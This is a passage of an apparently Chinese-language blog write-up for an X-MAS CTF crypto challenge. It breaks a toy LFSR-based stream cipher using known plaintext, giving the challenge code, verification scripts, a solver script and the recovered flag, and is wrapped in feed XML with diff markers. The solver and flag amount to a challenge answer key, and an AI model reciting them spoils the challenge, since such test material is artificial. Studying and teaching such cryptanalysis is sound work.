class="built_in">bin</span>(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">64</span>:<span class="number">96</span>], <span class="number">2</span>)</span><br><span class="line">        self.aux = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parity</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">4</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">2</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getseed</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(os.urandom(<span class="number">12</span>).encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LFSR</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.iv &gt;&gt; <span class="number">1</span> | (self.parity(self.iv &amp; self.key) &lt;&lt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.aux, self.iv = self.iv, self.LFSR()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_byte</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = self.iv ^ self.mask</span><br><span class="line">        self.<span class="built_in">next</span>()</span><br><span class="line">        x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">        <span class="keyword">return</span> (x &amp; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s</span>):</span></span><br><span class="line">    o = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        o += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ p.next_byte())</span><br><span class="line">    <span class="keyword">return</span> o.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = PRNG()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(encrypt(flag))</span><br></pre></td></tr></table></figure><p>flag.enc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab38abdef046216128f8ea76ccfcd38a4a8649802e95f817a2fc945dc04a966d502ef1e31d0a2d</span><br></pre></td></tr></table></figure><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>可以看到程序采用异或方式加密了 flag，而每次与 flag 异或的字节由类中的 <code>next_byte</code>方法生成。我们再看一下这个类，发现构造函数初始化了四个变量，其中 <code>iv、key、mask</code>都是根据随机字符串生成的 32 位比特流，我们无法得知，aux 这个变量初始化为 0。</p><p>我们来从头过一下 <code>next_byte</code>这个方法是怎么生成一个字节的：</p><p>把 iv 和 mask 进行异或得到 x，进行 <code>x ^= x &gt;&gt; 16</code> <code>x ^= x &gt;&gt; 8</code> 这两步，把 <code>x &amp; 255</code>结果返回，这就是生成的字节。而在这之中调用了 next 方法改变了类的 iv，而 mask 始终不变。</p><p>我们不难发现这几步操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line"><span class="keyword">return</span> x &amp; <span class="number">255</span></span><br></pre></td></tr></table></figure><p>其实就是把 x 的低 32 bit 按顺序分成四组，每组 8 个比特，四组数进行异或就是返回的结果。（不信可以拿个数试试）</p><p>我们再来看一下 iv 每次是如何改变的，next 函数就一行语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.aux, self.iv = self.iv, self.LFSR()</span><br></pre></td></tr></table></figure><p>aux我们不管，因为它没有参与任何运算。新的 iv 被 LFSR 函数的返回值赋值，看一下 LFSR 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self.iv &gt;&gt; <span class="number">1</span> | (self.parity(self.iv &amp; self.key) &lt;&lt; <span class="number">32</span>)</span><br></pre></td></tr></table></figure><p>返回了 iv 与 parity 函数返回值右移 32 位 进行或运算的结果。</p><p>我们再来看一下 parity 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">4</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">2</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> x &amp; <span class="number">1</span></span><br></pre></td></tr></table></figure><p>和前面 next_byte 的差不多，不难分析出这个 parity 实际就是把 x 的低 32 个比特之间进行异或，返回结果。当然，结果只能是 0 或1。</p><p>如果把 <code>(self.parity(self.iv &amp; self.key) &lt;&lt; 32)</code> 的结果比作 s，那么 s 两种可能，0 和 2**32。</p><p>新的 iv 是由当前的 iv 右移一位和 s 进行与操作得到的。注意这里 iv 可能是 32 位，也可能是 33 位，因为 2**32 是 33 位。</p><p>把各个函数和 iv 生成方法过了一遍，发现我们什么也不知道，已知只有密文，初始 iv ，mask，key 都是未知。但是还有一个条件，我们是知道 flag 是以<code>X-MAS&#123;</code>开头的。这样我们可以得到 next_byte 生成的前 6 个字节，但是我们也无法还原初始 iv 和 mask，key。注意，我们只需要<strong>还原明文</strong>就可以了，不需要知道 iv，mask以及 key 。</p><p>我用一个图来说明一下字节的生成：</p><table><thead><tr><th></th><th>i[1]</th><th>i[2]</th><th>i[3]</th><th>i[4]</th><th>i[5]</th><th>i[6]</th><th>i[7]</th><th>i[8]</th></tr></thead><tbody><tr><td>xor</td><td>i[9]</td><td>i[10]</td><td>i[11]</td><td>i[12]</td><td>i[13]</td><td>i[14]</td><td>i[15]</td><td>i[16]</td></tr><tr><td>xor</td><td>i[17]</td><td>i[18]</td><td>i[19]</td><td>i[20]</td><td>i[21]</td><td>i[22]</td><td>i[23]</td><td>i[24]</td></tr><tr><td>xor</td><td>i[25]</td><td>i[26]</td><td>i[27]</td><td>i[28]</td><td>i[29]</td><td>i[30]</td><td>i[31]</td><td>i[32]</td></tr><tr><td>xor</td><td>m[1]</td><td>m[2]</td><td>m[3]</td><td>m[4]</td><td>m[5]</td><td>m[6]</td><td>m[7]</td><td>m[8]</td></tr><tr><td>xor</td><td>m[9]</td><td>m[10]</td><td>m[11]</td><td>m[12]</td><td>m[13]</td><td>m[14]</td><td>m[15]</td><td>m[16]</td></tr><tr><td>xor</td><td>m[17]</td><td>m[18]</td><td>m[19]</td><td>m[20]</td><td>m[21]</td><td>m[22]</td><td>m[23]</td><td>m[24]</td></tr><tr><td>xor</td><td>m[25]</td><td>m[26]</td><td>m[27]</td><td>m[28]</td><td>m[29]</td><td>m[30]</td><td>m[31]</td><td>m[32]</td></tr></tbody></table><p>把 xor 当成正常的加法，一列的进行异或，最终得到的八个比特就是生成的字节。其中 i[1] 代表 iv <strong>低32比特中</strong>从高到低的第 1 个比特（因为后面 iv 可能 33 个比特），m[5] 代表 mask 从高到低的第 5 个比特。</p><p>当下一次生成字节的时候，iv 因为发生了变化，变化后的 iv_new[2]—iv_new[32] 这 31 位是之前 iv[1]—iv[31] 这31 位（因为右移了一位），而 iv_new[1]是 0，可能新的 iv 有 33 位，但那个最高位并没有参与到字节的生成中，我们不需要管。此时生成字节的图是：</p><table><thead><tr><th></th><th>0</th><th>i[1]</th><th>i[2]</th><th>i[3]</th><th>i[4]</th><th>i[5]</th><th>i[6]</th><th>i[7]</th></tr></thead><tbody><tr><td>xor</td><td>i[8]</td><td>i[9]</td><td>i[10]</td><td>i[11]</td><td>i[12]</td><td>i[13]</td><td>i[14]</td><td>i[15]</td></tr><tr><td>xor</td><td>i[16]</td><td>i[17]</td><td>i[18]</td><td>i[19]</td><td>i[20]</td><td>i[21]</td><td>i[22]</td><td>i[23]</td></tr><tr><td>xor</td><td>i[24]</td><td>i[25]</td><td>i[26]</td><td>i[27]</td><td>i[28]</td><td>i[29]</td><td>i[30]</td><td>i[31]</td></tr><tr><td>xor</td><td>m[1]</td><td>m[2]</td><td>m[3]</td><td>m[4]</td><td>m[5]</td><td>m[6]</td><td>m[7]</td><td>m[8]</td></tr><tr><td>xor</td><td>m[9]</td><td>m[10]</td><td>m[11]</td><td>m[12]</td><td>m[13]</td><td>m[14]</td><td>m[15]</td><td>m[16]</td></tr><tr><td>xor</td><td>m[17]</td><td>m[18]</td><td>m[19]</td><td>m[20]</td><td>m[21]</td><td>m[22]</td><td>m[23]</td><td>m[24]</td></tr><tr><td>xor</td><td>m[25]</td><td>m[26]</td><td>m[27]</td><td>m[28]</td><td>m[29]</td><td>m[30]</td><td>m[31]</td><td>m[32]</td></tr></tbody></table><p>这个图中的 i[1] 和上一个图中的 i[1] 表示的含义完全相同，就是初始的 iv 低32比特中从高到低的第一个比特。</p><p>我们可以发现，前四行异或的结果，和上一个图中前四行异或的结果，有 <strong>7</strong> 位都是相同的，相当于结果右移了一位，在前面又补了一位。但是 mask 和 iv 的异或对应关系被打乱了。</p><p>我们可以换一种思路想，虽然我们不知道 mask 的具体 32 个比特，但是有用的只有八个比特，就是后四行异或的结果。所以我们通过已知的六个字符明文<code>X-MAS&#123;</code>和完整密文来算出这八个比特。至于前四行异或的结果，相当于一个 LFSR，右移一位，同时前面补位。</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>我们有了明文的前六个字符<code>X-MAS&#123;</code>以及密文，可以得到生成的前 6 个字节，我们来验证一下前面分析的是否正确。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>).read().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(c[<span class="number">6</span>:])</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">&quot;X-MAS&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    byte.append(<span class="built_in">ord</span>(c[i])^<span class="built_in">ord</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span> byte</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bin</span>(byte[<span class="number">0</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==<span class="built_in">bin</span>(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="built_in">print</span> i,<span class="built_in">bin</span>(byte[<span class="number">0</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),<span class="built_in">bin</span>(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>运行发现输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 10111011 01011101</span><br><span class="line">183 01000100 10100010</span><br></pre></td></tr></table></figure><p>程序里的 i 就是表格中后面 4 行异或的结果，是两个… 我们再调整一下，把判断条件里的 byte[0] 和 byte[1] 改成byte[1] 和 byte[2]，看看结果一样不：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>).read().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">&quot;X-MAS&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    byte.append(<span class="built_in">ord</span>(c[i])^<span class="built_in">ord</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span> byte                                  <span class="comment">#生成的字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bin</span>(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==<span class="built_in">bin</span>(byte[<span class="number">2</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="built_in">print</span> i,<span class="built_in">bin</span>(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),<span class="built_in">bin</span>(byte[<span class="number">2</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 01011101 10101110</span><br><span class="line">183 10100010 01010001</span><br></pre></td></tr></table></figure><p>也是 72 和183 ，验证了我们之前的分析时正确的。</p><p>这样我们解题思路就清晰了，得到了实际有用的 “mask”,我们只需要每次移位的时候，最高位填 0 和 1 都试一下，看看哪个解密能得到正常的字符。然后填充正确的比特，循环得到全部 flag。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>我们需要得到生成第 6 个字节后的状态：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>).read().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">&quot;X-MAS&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    byte.append(<span class="built_in">ord</span>(c[i])^<span class="built_in">ord</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span> byte                                  <span class="comment">#生成的字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bin</span>(byte[<span class="number">4</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==<span class="built_in">bin</span>(byte[<span class="number">5</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="built_in">print</span> i,<span class="built_in">bin</span>(byte[<span class="number">4</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),<span class="built_in">bin</span>(byte[<span class="number">5</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 11101011 01110101</span><br><span class="line">183 00010100 10001010</span><br></pre></td></tr></table></figure><p>如果选用 72 作为有效 mask，此时状态是 <code>01110101</code></p><p>写出 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#written by R1sker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">list</span>=string.ascii_letters+string.digits+<span class="string">&quot;_&quot;</span>+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR1</span>(<span class="params">iv</span>):</span></span><br><span class="line">    <span class="keyword">return</span> iv &gt;&gt; <span class="number">1</span> | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR0</span>(<span class="params">iv</span>):</span></span><br><span class="line">    <span class="keyword">return</span> iv &gt;&gt; <span class="number">1</span> | (<span class="number">0</span> &lt;&lt; <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">c=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>).read().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">flag=<span class="string">&quot;X-MAS&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">mask=<span class="number">72</span></span><br><span class="line">s=<span class="number">0b01110101</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> c[<span class="number">6</span>:]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)^mask^LFSR1(s)) <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        s=LFSR1(s)</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(j)^mask^s)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)^mask^LFSR0(s)) <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        s=LFSR0(s)</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j) ^ mask ^ s)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-450e0033c231ceb1.png" alt="image.png"></p><blockquote><p>X-MAS{S4n7a_4lw4ys_g1ve5_n1c3_pr3s3n7s}</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Crypto 真好玩，滚去学 Web 了，毕竟还是一只 Web 狗。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;线性反馈移位寄存器（LFSR）在流密码中有广泛的应用，是指给定前一状态的输出，将该输出的线性函数再用作输入的移位寄存器。LFSR 主要用于生成一串随机的比特流，比特流可用做加密明文的密钥。&lt;/p&gt;
-&lt;p&gt;LFSR 基本原理大致就是通过当前状态进行一些线性运算来确定下一状态。不清楚的可以参考&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33920501&quot;&gt;这篇文章&lt;/a&gt;学习一下流密码和 LFSR 。&lt;/p&gt;
-&lt;p&gt;最开始接触 LFSR 是在强网杯的 streamgame，后来密码学课程上比较详细学习了流密码和 LFSR，再到今年国赛初赛中的 oldstream，最近的 X-MAS CTF 中一道密码题我看到了 LFSR 的一些新玩法，总结一下。&lt;/p&gt;</summary>
-    
-    
-    
-    
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
-    
-    <category term="Crypto" scheme="http://igml.top/tags/Crypto/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
   </entry>
   
